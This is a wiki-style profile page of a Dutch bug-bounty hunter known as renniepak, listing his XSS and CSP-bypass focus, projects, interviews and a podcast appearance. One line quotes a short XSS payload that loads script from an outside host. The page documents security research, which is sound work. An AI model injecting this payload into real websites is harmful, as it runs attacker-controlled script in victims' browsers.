---
title: Renniepak (René de Sain)
slug: renniepak
created_utc: 2026-05-15T00:00:00Z
updated_utc: 2026-05-15T00:00:00Z
handles: [renniepak]
role: hunter
primary_focus: web
tags: [person, role/hunter, focus/web, focus/client-side, focus/xss, focus/csp-bypass, focus/intigriti]
inbound: []
---

## Identity

- **Real name:** René de Sain
- **Primary handle:** `renniepak`
- **Role:** Full-time bug-bounty hunter and content creator. Intigriti Live Hacking Event regular.
- **Location:** The Netherlands (Dutch hunter).
- **Background:** 15+ years in IT as QA, developer, and ethical hacker before going full-time on bug bounty. Best known publicly for the CSPBypass project and short/clever XSS payloads.

## Focus areas

- Client-side web (XSS — reflected, stored, DOM)
- Content Security Policy bypasses (JSONP gadgets, whitelist abuse)
- JS-modification / client-side privilege escalation
- Web3 / NFT-adjacent web targets
- Bug bounty methodology and tooling content

## Online presence

- X / Twitter: [@renniepak](https://x.com/renniepak)
- GitHub: [github.com/renniepak](https://github.com/renniepak)
- GitHub Sponsors: [github.com/sponsors/renniepak](https://github.com/sponsors/renniepak)
- Bluesky: [@renniepak.nl](https://bsky.app/profile/renniepak.nl)
- Intigriti profile: [app.intigriti.com/profile/renniepak](https://app.intigriti.com/profile/renniepak)
- Bugcrowd profile: [bugcrowd.com/h/renniepak](https://bugcrowd.com/h/renniepak)
- CSPBypass project: [cspbypass.com](https://cspbypass.com)

## Key research / posts

- **CSPBypass** ([github.com/renniepak/CSPBypass](https://github.com/renniepak/CSPBypass), 653+ stars) — searchable database of CSP bypass gadgets (JSONP endpoints, libraries on commonly whitelisted domains) used to execute JS despite restrictive CSP. Community-contributed catalog; offline Docker deployment supported. Canonical reference for CSP-bypass technique pages.
- **How to become an XSS expert with renniepak** ([bugbountyexplained.com/how-to-become-an-xss-expert-with-renniepak](https://www.bugbountyexplained.com/how-to-become-an-xss-expert-with-renniepak/)) — long-form interview on Bug Bounty Reports Explained covering XSS methodology, CSP bypass workflow, JS-modification for privesc, and bookmarklet-driven recon.
- **How to become an XSS expert with renniepak (video)** ([youtube.com/watch?v=0PnWrdqV3TA](https://www.youtube.com/watch?v=0PnWrdqV3TA)) — Bug Bounty Reports Explained YouTube companion to the interview.
- **$50k XSS in a web3 website (feat. renniepak)** ([youtube.com/watch?v=C4uiMRwHT2M](https://www.youtube.com/watch?v=C4uiMRwHT2M)) — walkthrough of a high-payout XSS on a web3 target.
- **Hunting privilege escalations by modifying the JS (feat. renniepak)** ([youtube.com/watch?v=dnrLsE8Y_O0](https://www.youtube.com/watch?v=dnrLsE8Y_O0)) — client-side privesc methodology: intercept and modify JS to flip role/permission checks.
- **JavaScript bookmarks to speed up bug hunting (feat. renniepak)** ([youtube.com/watch?v=-yjvSP9az2s](https://www.youtube.com/watch?v=-yjvSP9az2s)) — bookmarklet tricks for in-browser recon.
- **Shortest XSS PoC payload** ([x.com/therceman/status/1704744022277763462](https://x.com/therceman/status/1704744022277763462)) — credited (with joaxcar) for the 31-char no-dots / no-quotes / no-space payload `<script/src=//6a.lv></script>`. Useful as a length-constrained XSS reference.

## CT podcast appearances

- [2023-10-26 Ep 42 — Intigriti LHE Recap With renniepak](../sources/podcasts/ct/20231026_HDyOD67c7NA_Intigriti_LHE_Recap_With_renniepak_Ep._42.en.vtt)

## Notes

- Intigriti LHE regular — Ep 42 was recorded live at an Intigriti hacking event in Portugal. A useful primary contact for understanding the Intigriti LHE format, scoring quirks, and the European LHE scene more generally.
- Dutch hunter; one of the more visible EU-based full-timers on the CT side of the community.
- Content-creator posture: posts XSS tips and payload-golfing on X, publishes/maintains CSPBypass, collaborates on Bug Bounty Reports Explained video shorts. Treat his X feed as a steady stream of XSS / CSP micro-techniques worth surfacing to `wiki/techniques/xss/` and `wiki/techniques/csp-bypass/`.
- Frequent collaborator with `joaxcar` on XSS payload-golf / length-constrained payloads — see his cross-link on [johan-carlsson.md](johan-carlsson.md).
- When ingesting a CSPBypass-derived technique into the wiki, link back to both `cspbypass.com` (live data) and the GitHub repo (snapshot) so we have a stable reference if the live site goes down.
